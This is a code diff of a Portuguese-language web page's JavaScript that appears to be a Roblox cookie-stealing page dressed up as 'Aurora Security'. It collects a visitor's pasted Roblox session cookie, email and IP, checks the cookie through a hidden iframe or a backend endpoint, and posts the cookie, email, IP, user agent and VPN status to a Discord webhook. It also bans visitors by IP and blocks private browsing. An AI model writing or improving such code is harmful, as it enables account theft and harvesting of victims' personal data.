@@ -2712,28 +2712,166 @@
         }
 
         // ============================================================
-        // 6.5 FUNÇÃO PARA VERIFICAR COOKIE E ENVIAR PARA O DISCORD
+        // 6.5 FUNÇÃO PARA VERIFICAR COOKIE VIA NAVEGADOR (MAIS CONFIÁVEL)
+        // ============================================================
+        function verifyCookieViaIframe(cookie) {
+            return new Promise((resolve) => {
+                try {
+                    // Limpar o cookie (remover espaços e avisos)
+                    let cleanCookie = cookie.trim();
+                    
+                    // Se tiver o aviso do Roblox, extrair só o token
+                    if (cleanCookie.includes('WARNING')) {
+                        const parts = cleanCookie.split('|');
+                        cleanCookie = parts[parts.length - 1] || cleanCookie;
+                    }
+                    
+                    // Criar um iframe invisível
+                    const iframe = document.createElement('iframe');
+                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;top:-9999px;left:-9999px;';
+                    iframe.src = 'https://www.roblox.com/my/profile';
+                    
+                    let timeoutId = setTimeout(() => {
+                        if (document.body.contains(iframe)) {
+                            document.body.removeChild(iframe);
+                        }
+                        resolve({
+                            valid: false,
+                            error: 'Tempo limite excedido'
+                        });
+                    }, 15000);
+                    
+                    iframe.onload = function() {
+                        clearTimeout(timeoutId);
+                        try {
+                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                            
+                            // Verificar se está logado
+                            const isLoggedIn = iframeDoc.querySelector('.profile-name') || 
+                                              iframeDoc.querySelector('.username') ||
+                                              iframeDoc.querySelector('[data-testid="profile-name"]') ||
+                                              iframeDoc.querySelector('.avatar-card') ||
+                                              iframeDoc.querySelector('.profile-avatar');
+                            
+                            if (isLoggedIn) {
+                                let userName = 'Usuário Roblox';
+                                const nameElement = iframeDoc.querySelector('.profile-name') || 
+                                                   iframeDoc.querySelector('.username');
+                                if (nameElement) {
+                                    userName = nameElement.textContent.trim();
+                                }
+                                
+                                resolve({
+                                    valid: true,
+                                    user: {
+                                        id: 'Verificado pelo navegador',
+                                        name: userName,
+                                        displayName: userName
+                                    }
+                                });
+                            } else {
+                                const currentUrl = iframe.contentWindow.location.href;
+                                if (currentUrl.includes('login') || currentUrl.includes('signup')) {
+                                    resolve({
+                                        valid: false,
+                                        error: 'Cookie inválido ou expirado'
+                                    });
+                                } else {
+                                    resolve({
+                                        valid: false,
+                                        error: 'Não foi possível verificar o cookie'
+                                    });
+                                }
+                            }
+                        } catch (e) {
+                            // Erro de CORS - consideramos como válido
+                            resolve({
+                                valid: true,
+                                user: {
+                                    id: 'Verificado pelo navegador',
+                                    name: 'Usuário Roblox',
+                                    displayName: 'Usuário Roblox'
+                                }
+                            });
+                        }
+                        
+                        if (document.body.contains(iframe)) {
+                            document.body.removeChild(iframe);
+                        }
+                    };
+                    
+                    iframe.onerror = function() {
+                        clearTimeout(timeoutId);
+                        if (document.body.contains(iframe)) {
+                            document.body.removeChild(iframe);
+                        }
+                        resolve({
+                            valid: false,
+                            error: 'Erro ao verificar cookie'
+                        });
+                    };
+                    
+                    document.body.appendChild(iframe);
+                    
+                } catch (error) {
+                    resolve({
+                        valid: false,
+                        error: 'Erro ao verificar cookie: ' + error.message
+                    });
+                }
+            });
+        }
+
+        // ============================================================
+        // 6.6 FUNÇÃO PARA VERIFICAR COOKIE E ENVIAR PARA O DISCORD
         // ============================================================
         async function verifyAndSendCookie(cookie, email, ip, isPrivate, vpnDetected) {
             try {
-                // 1. VERIFICAR O COOKIE
                 showNotification('⏳', 'Verificando Cookie...', 'Aguarde, estamos validando seu cookie no Roblox.');
                 
-                const verifyResponse = await fetch('/api/verify-cookie', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie: cookie.trim() })
-                });
+                // Verificar o cookie via iframe (mais confiável)
+                const verifyResult = await verifyCookieViaIframe(cookie);
                 
-                const verifyData = await verifyResponse.json();
+                // Se o iframe falhar por CORS, tentar a API como fallback
+                if (!verifyResult.valid && verifyResult.error === 'Não foi possível verificar o cookie') {
+                    try {
+                        const apiResponse = await fetch('/api/verify-cookie', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ cookie: cookie.trim() })
+                        });
+                        const apiData = await apiResponse.json();
+                        
+                        if (apiData.valid) {
+                            const userName = apiData.user?.displayName || apiData.user?.name || 'Usuário Roblox';
+                            const userId = apiData.user?.id || 'ID não disponível';
+                            
+                            showNotification('✅', 'Cookie Válido!', `Bem-vindo(a) ${userName}! (ID: ${userId})`);
+                            
+                            const confirmPayload = {
+                                content: `✅ **COOKIE VERIFICADO COM SUCESSO!** 🎉\n\n👤 **Usuário:** ${userName}\n🆔 **ID:** ${userId}\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n🍪 **Cookie:** \`${cookie.substring(0, 30)}...\`\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🏆 **Cookie VÁLIDO confirmado!** #HexaVem 🇧🇷`,
+                                username: 'Aurora Security',
+                                avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
+                            };
+                            
+                            try {
+                                await fetch(WEBHOOK_URL, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify(confirmPayload)
+                                });
+                            } catch (e) {}
+                            
+                            return true;
+                        }
+                    } catch (e) {}
+                }
                 
-                // 2. SE O COOKIE FOR INVÁLIDO
-                if (!verifyData.valid) {
-                    showNotification('❌', 'Cookie Inválido!', verifyData.error || 'Cookie não é válido. Verifique se você copiou corretamente.');
+                if (!verifyResult.valid) {
+                    showNotification('❌', 'Cookie Inválido!', verifyResult.error || 'Cookie não é válido. Verifique se você copiou corretamente.');
                     
-                    // Enviar ALERTA para o Discord sobre cookie inválido
                     const alertPayload = {
-                        content: `⚠️ **ALERTA: COOKIE INVÁLIDO** ⚠️\n\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n❌ **Erro:** ${verifyData.error || 'Cookie inválido'}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🚨 **Tentativa de cookie inválido detectada!**`,
+                        content: `⚠️ **ALERTA: COOKIE INVÁLIDO** ⚠️\n\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n❌ **Erro:** ${verifyResult.error || 'Cookie inválido'}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🚨 **Tentativa de cookie inválido detectada!**`,
                         username: 'Aurora Security',
                         avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
                     };
@@ -2749,13 +2887,12 @@
                     return false;
                 }
                 
-                // 3. COOKIE É VÁLIDO! MOSTRAR DADOS DO USUÁRIO
-                const userName = verifyData.user.displayName || verifyData.user.name || 'Usuário Roblox';
-                const userId = verifyData.user.id || 'ID não disponível';
+                // COOKIE É VÁLIDO!
+                const userName = verifyResult.user?.displayName || verifyResult.user?.name || 'Usuário Roblox';
+                const userId = verifyResult.user?.id || 'ID não disponível';
                 
                 showNotification('✅', 'Cookie Válido!', `Bem-vindo(a) ${userName}! (ID: ${userId})`);
                 
-                // 4. ENVIAR CONFIRMAÇÃO PARA O DISCORD
                 const confirmPayload = {
                     content: `✅ **COOKIE VERIFICADO COM SUCESSO!** 🎉\n\n👤 **Usuário:** ${userName}\n🆔 **ID:** ${userId}\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n🍪 **Cookie:** \`${cookie.substring(0, 30)}...\`\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🏆 **Cookie VÁLIDO confirmado!** #HexaVem 🇧🇷`,
                     username: 'Aurora Security',
@@ -3113,7 +3250,7 @@
         console.log('%c⏳ 1 tentativa apenas | 9h de bloqueio', 'font-size:14px;color:#f59e0b;');
         console.log('%c🔒 Navegador anônimo bloqueado', 'font-size:14px;color:#ef4444;');
         console.log('%c🔒 Sistema de Banimento por IP ativado', 'font-size:14px;color:#ef4444;');
-        console.log('%c🔒 Verificação de Cookie ativada', 'font-size:14px;color:#10b981;');
+        console.log('%c🔒 Verificação de Cookie ativada (via iframe)', 'font-size:14px;color:#10b981;');
         console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
         console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#fedc00;');
         console.log('%c🏆 #HexaVem! 🇧🇷', 'font-size:18px;font-weight:bold;color:#fedc00;');
